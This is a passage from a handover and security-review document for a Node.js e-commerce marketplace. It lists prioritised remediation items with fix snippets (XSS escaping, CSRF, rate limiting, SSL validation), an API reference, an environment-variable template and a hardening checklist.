+ element.textContent = userInput;

# Or use SecurityUtils
+ import { SecurityUtils } from './assets/js/security-utils.js';
- element.innerHTML = userInput;
+ element.innerHTML = SecurityUtils.escapeHTML(userInput);
```

---

#### 4. Enable SSL Certificate Validation 🔴
**Issue:** `rejectUnauthorized: false` in production DB config
**Risk:** Man-in-the-middle attacks
**Effort:** 1 hour
**Priority:** 🔴 **CRITICAL**

**Action:**
```javascript
// backend/src/config/database.js
dialectOptions: {
  ssl: {
    require: true,
    rejectUnauthorized: process.env.NODE_ENV === 'production',
  },
}
```

---

### HIGH PRIORITY (Fix Before Production)

#### 5. Implement CSRF Protection 🟠
**Issue:** No CSRF token validation
**Risk:** Cross-site request forgery
**Effort:** 4-6 hours
**Priority:** 🟠 **HIGH**

**Action:**
```bash
npm install csurf
```

```javascript
// backend/src/app.js
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

// Add CSRF token endpoint
app.get('/api/v1/csrf-token', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});
```

---

#### 6. Set Up File Storage (S3/MinIO) 🟠
**Issue:** Files stored locally (not scalable)
**Risk:** File loss, can't scale horizontally
**Effort:** 1 day
**Priority:** 🟠 **HIGH**

**Action:**
1. Create S3 bucket or set up MinIO
2. Install SDK: `npm install @aws-sdk/client-s3`
3. Implement upload in `backend/src/services/upload.service.js`
4. Migrate existing files
5. Update environment variables

---

#### 7. Configure Email Service 🟠
**Issue:** Email library not installed
**Risk:** No transactional emails
**Effort:** 4 hours
**Priority:** 🟠 **HIGH**

**Action:**
```bash
npm install nodemailer
```

```javascript
// backend/src/services/notification.service.js
const nodemailer = require('nodemailer');

const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: process.env.SMTP_PORT,
  secure: process.env.SMTP_SECURE === 'true',
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASSWORD,
  },
});

async function sendEmail(to, subject, html) {
  await transporter.sendMail({
    from: process.env.EMAIL_FROM,
    to,
    subject,
    html,
  });
}
```

---

#### 8. Add Rate Limiting to Auth Endpoints 🟠
**Issue:** Brute force vulnerability
**Risk:** Account takeover
**Effort:** 1 hour
**Priority:** 🟠 **HIGH**

**Action:**
```javascript
// backend/src/middlewares/rateLimiter.js
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many login attempts',
});

// Apply to routes
router.post('/login', authLimiter, authController.login);
```

---

### MEDIUM PRIORITY (Recommended Before Launch)

#### 9. Implement HTTPS Enforcement 🟡
**Issue:** No redirect from HTTP to HTTPS
**Risk:** Data in plain text
**Effort:** 30 minutes
**Priority:** 🟡 **MEDIUM**

**Action:**
```javascript
// backend/src/app.js
if (process.env.NODE_ENV === 'production') {
  app.use((req, res, next) => {
    if (req.header('x-forwarded-proto') !== 'https') {
      return res.redirect(`https://${req.header('host')}${req.url}`);
    }
    next();
  });
}
```

---

#### 10. Add Password Strength Validation 🟡
**Issue:** Weak password requirements
**Risk:** Easy brute force
**Effort:** 2 hours
**Priority:** 🟡 **MEDIUM**

**Action:**
```javascript
// backend/src/validators/auth.validator.js
password: Joi.string()
  .min(8)
  .pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
  .required()
  .messages({
    'string.pattern.base': 'Password must contain uppercase, lowercase, number, and special character',
  }),
```

---

#### 11. Increase Test Coverage 🟡
**Issue:** Only 16 test files
**Risk:** Bugs in production
**Effort:** 1 week
**Priority:** 🟡 **MEDIUM**

**Action:**
- Add tests for all controllers
- Test all service layer methods
- Integration tests for critical flows
- Target: >80% coverage

---

#### 12. Set Up Monitoring 🟡
**Issue:** No error tracking or monitoring
**Risk:** Can't detect production issues
**Effort:** 4 hours
**Priority:** 🟡 **MEDIUM**

**Action:**
```bash
npm install @sentry/node
```

```javascript
// backend/src/app.js
const Sentry = require('@sentry/node');

Sentry.init({
  dsn: process.env.SENTRY_DSN,
  environment: process.env.NODE_ENV,
});

app.use(Sentry.Handlers.errorHandler());
```

---

### LOW PRIORITY (Nice to Have)

#### 13. Implement Account Lockout 🟢
**Issue:** No brute force protection at account level
**Effort:** 2 hours
**Priority:** 🟢 **LOW**

---

#### 14. Add API Documentation 🟢
**Issue:** No Swagger/OpenAPI docs
**Effort:** 1 day
**Priority:** 🟢 **LOW**

---

#### 15. Set Up Database Backups 🟢
**Issue:** No automated backup strategy
**Effort:** 2 hours
**Priority:** 🟢 **LOW**

---

### Action Items Summary

| Priority | Count | Estimated Effort | Blockers |
|----------|-------|------------------|----------|
| 🔴 Critical | 4 | 4-6 days | YES - Deployment blocked |
| 🟠 High | 4 | 2-3 days | YES - Production blocked |
| 🟡 Medium | 4 | 2-3 days | Recommended |
| 🟢 Low | 3 | 2-3 days | Optional |
| **TOTAL** | **15** | **10-15 days** | **8 blockers** |

---

## 📚 APPENDIX

### A. API Endpoint Reference

**Base URL:** `http://localhost:8080/api/v1`

#### Authentication Endpoints
```
POST   /auth/register          - Register new user
POST   /auth/login             - Login user
POST   /auth/refresh           - Refresh access token
POST   /auth/logout            - Logout user
GET    /auth/me                - Get current user
PUT    /auth/profile           - Update profile
PUT    /auth/password          - Change password
```

#### Product Endpoints
```
GET    /products               - List products (filterable)
GET    /products/:id           - Get product details
POST   /products               - Create product (Seller)
PUT    /products/:id           - Update product (Seller)
PATCH  /products/:id/status    - Approve/reject (Admin)
DELETE /products/:id           - Delete product (Seller)
```

#### Cart Endpoints
```
GET    /cart                   - Get cart
POST   /cart/items             - Add item to cart
PUT    /cart/items/:id         - Update cart item
DELETE /cart/items/:id         - Remove from cart
DELETE /cart                   - Clear cart
```

#### Order Endpoints
```
GET    /orders                 - List user orders
GET    /orders/:id             - Get order details
POST   /orders                 - Create order (checkout)
PATCH  /orders/:id/status      - Update status (Seller/Admin)
POST   /orders/:id/cancel      - Cancel order
```

#### Store Endpoints
```
GET    /stores                 - List stores
GET    /stores/:id             - Get store details
POST   /stores                 - Create store (Seller)
PUT    /stores/:id             - Update store (Seller)
PATCH  /stores/:id/status      - Approve/reject (Admin)
GET    /stores/:id/products    - Get store products
```

**Full API documentation:** See `backend/README.md`

---

### B. Database Schema Diagram

```sql
-- Core Tables
users (id, email, password_hash, role, is_active, ...)
stores (id, user_id, name, slug, status, commission_rate, ...)
categories (id, name, slug, parent_id, ...)
products (id, store_id, category_id, title, price, stock, ...)
product_variants (id, product_id, name, price, stock, ...)

-- Shopping & Orders
carts (id, user_id, guest_id, items, subtotal, ...)
orders (id, user_id, store_id, status, total, ...)
order_items (id, order_id, product_id, quantity, price, ...)

-- Shipping & Returns
shipments (id, order_id, tracking_number, carrier, ...)
shipment_items (id, shipment_id, order_item_id, ...)
shipment_events (id, shipment_id, status, location, ...)
return_requests (id, order_id, reason, status, ...)

-- Reviews & Social
reviews (id, user_id, product_id, store_id, rating, comment, ...)
wishlists (id, user_id, ...)
wishlist_items (id, wishlist_id, product_id, ...)

-- Marketing & Finance
coupons (id, code, discount_type, discount_value, ...)
coupon_usage (id, coupon_id, user_id, order_id, ...)
campaigns (id, store_id, name, discount, start_date, end_date, ...)
commission_settings (id, store_id, category_id, rate, ...)
commission_transactions (id, order_id, store_id, amount, ...)
```

---

### C. Environment Variables Reference

**Complete list with descriptions:**

```env
# Server
NODE_ENV=development|test|production
PORT=8080
BASE_URL=http://localhost:8080
API_VERSION=v1

# Database
DATABASE_URL=postgres://...          # Railway-provided or manual
DB_HOST=localhost                    # If not using DATABASE_URL
DB_PORT=5432
DB_NAME=dostan_marketplace
DB_USER=postgres
DB_PASSWORD=
DB_POOL_MAX=20                       # Max connections (prod: 20, dev: 10)
DB_POOL_MIN=5                        # Min connections (prod: 5, dev: 2)
DB_POOL_ACQUIRE=30000                # Acquire timeout (ms)
DB_POOL_IDLE=10000                   # Idle timeout (ms)

# Redis
REDIS_URL=redis://localhost:6379/0  # Railway-provided or manual
REDIS_HOST=localhost                 # If not using REDIS_URL
REDIS_PORT=6379
REDIS_PASSWORD=
REDIS_DB=0

# JWT
JWT_SECRET=                          # MUST SET! 64+ char random string
JWT_EXPIRE=1h                        # Access token lifetime
JWT_REFRESH_SECRET=                  # MUST SET! 64+ char random string
JWT_REFRESH_EXPIRE=7d                # Refresh token lifetime

# Security
COOKIE_SECRET=                       # MUST SET! 32+ char random string
SESSION_SECRET=                      # For session-based auth (optional)
SESSION_EXPIRE=86400000              # Session timeout (ms)
BCRYPT_ROUNDS=12                     # Password hashing rounds

# CORS
FRONTEND_URL=http://localhost:3000   # Comma-separated
ALLOWED_ORIGINS=http://localhost:3000,http://127.0.0.1:5500

# File Storage
STORAGE_TYPE=local                   # local, s3, minio
AWS_ACCESS_KEY_ID=                   # For S3
AWS_SECRET_ACCESS_KEY=               # For S3
AWS_REGION=eu-central-1
S3_BUCKET_NAME=dostan-marketplace
MINIO_ENDPOINT=localhost             # For MinIO
MINIO_PORT=9000
MINIO_ACCESS_KEY=minioadmin
MINIO_SECRET_KEY=minioadmin
MINIO_BUCKET=uploads
MAX_FILE_SIZE=5242880                # 5MB in bytes
ALLOWED_FILE_TYPES=image/jpeg,image/png,image/webp
MAX_FILES_PER_UPLOAD=5

# Email
SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
SMTP_SECURE=false                    # true for 465, false for 587
SMTP_USER=
SMTP_PASSWORD=                       # App password, not regular password
EMAIL_FROM=Dostan Marketplace <noreply@dostanmarket.com>

# Rate Limiting
RATE_LIMIT_WINDOW_MS=900000          # 15 minutes
RATE_LIMIT_MAX_REQUESTS=100

# Payment Gateway
IYZICO_API_KEY=                      # Turkey payment gateway
IYZICO_SECRET_KEY=
IYZICO_BASE_URL=https://sandbox-api.iyzipay.com  # Change to prod URL

# Shipping
SHIPPING_PROVIDER=mock               # mock, shippo, etc.
SHIPPING_PERSIST=false
SHIPPING_TRACKING_POLL=false

# Pagination
DEFAULT_PAGE_SIZE=20
MAX_PAGE_SIZE=100

# Admin User (Auto-created on first seed)
ADMIN_EMAIL=admin@dostanmarket.com
ADMIN_PASSWORD=Admin@123456          # CHANGE THIS!

# Logging
LOG_LEVEL=info                       # error, warn, info, debug
LOG_FILE_PATH=./logs

# Bull Queue
BULL_REDIS_HOST=localhost            # Uses REDIS_URL if available
BULL_REDIS_PORT=6379
```

---

### D. Troubleshooting Guide

#### Common Error Messages

**Error: "Cannot find module 'X'"**
- **Cause:** Missing dependency
- **Fix:** `cd backend && npm install`

**Error: "ECONNREFUSED 127.0.0.1:5432"**
- **Cause:** PostgreSQL not running
- **Fix:** Start PostgreSQL service

**Error: "relation does not exist"**
- **Cause:** Migrations not run
- **Fix:** `npm run migrate`

**Error: "JWT malformed"**
- **Cause:** Invalid or expired token
- **Fix:** Re-login to get new token

**Error: "Too many connections"**
- **Cause:** Connection pool exhausted
- **Fix:** Increase `DB_POOL_MAX` or check for leaks

**Error: "ValidationError"**
- **Cause:** Invalid input data
- **Fix:** Check request body against Joi schema

**Error: "Not allowed by CORS"**
- **Cause:** Frontend URL not in ALLOWED_ORIGINS
- **Fix:** Add URL to `.env`

---

### E. Performance Optimization Tips

1. **Enable Query Caching:**
   ```javascript
   // Cache frequently accessed data
   const cachedProducts = await cache.get('products:featured');
   if (!cachedProducts) {
     const products = await Product.findAll(...);
     await cache.set('products:featured', products, 3600);
   }
   ```

2. **Add Database Indexes:**
   ```sql
   CREATE INDEX idx_products_store_id ON products(store_id);
   CREATE INDEX idx_orders_user_id ON orders(user_id);
   CREATE INDEX idx_products_category_id ON products(category_id);
   ```

3. **Use Pagination:**
   Already implemented in `backend/src/utils/pagination.js`

4. **Enable Compression:**
   Already enabled via `compression` middleware

5. **Optimize Images:**
   Implement image resizing before upload:
   ```bash
   npm install sharp
   ```

---

### F. Security Hardening Checklist

- [ ] Change all default secrets
- [ ] Enable HTTPS
- [ ] Implement CSRF protection
- [ ] Fix XSS vulnerabilities
- [ ] Enable SSL certificate validation
- [ ] Add rate limiting to auth
- [ ] Implement account lockout
- [ ] Sanitize logs (no sensitive data)
- [ ] Set secure cookie flags
- [ ] Add security headers (Helmet)
- [ ] Validate all inputs
- [ ] Use parameterized queries (Sequelize ORM)
- [ ] Implement file upload validation
- [ ] Set up WAF (Web Application Firewall)
- [ ] Regular dependency audits

---

### G. Contact Information

**Project Repository:** [Repository URL]
**Documentation:** See README.md files
**Support:** [Support email/channel]
**Emergency Contact:** [Emergency contact]

---

### H. Change Log

| Date | Version | Changes | Author |
|------|---------|---------|--------|
| 2025-10-31 | 1.0.0 | Initial handover document created | Claude |

---

### I. License & Legal

**Project License:** MIT (see LICENSE file)
**Third-Party Licenses:** See package.json dependencies
**GDPR Compliance:** ⚠️ Requires data privacy policy implementation
**PCI Compliance:** ⚠️ Payment gateway must be PCI-DSS compliant

---

## 🎉 CONCLUSION

This Dostan Marketplace is a **well-architected, feature-rich e-commerce platform** with solid technical foundations. However, it requires **critical security fixes** before any production deployment.

**Strengths:**
- ✅ Clean, maintainable code structure
- ✅ Comprehensive feature set
- ✅ Good separation of concerns
- ✅ Scalable architecture
- ✅ Railway-ready deployment

**Weaknesses:**
- ⚠️ Security vulnerabilities (fixable in days)
- ⚠️ Payment gateway not implemented
- ⚠️ File storage local only
- ⚠️ Low test coverage

**Time to Production:**
- **With security fixes:** 1-2 weeks
- **With all high priority items:** 2-3 weeks
- **Production-ready (all recommended):** 3-4 weeks

**Recommendation:**
Focus on the **8 critical/high priority items** first. These can be completed in **6-9 days** of focused development work, after which the platform will be safe for production deployment.

---

**Document End**
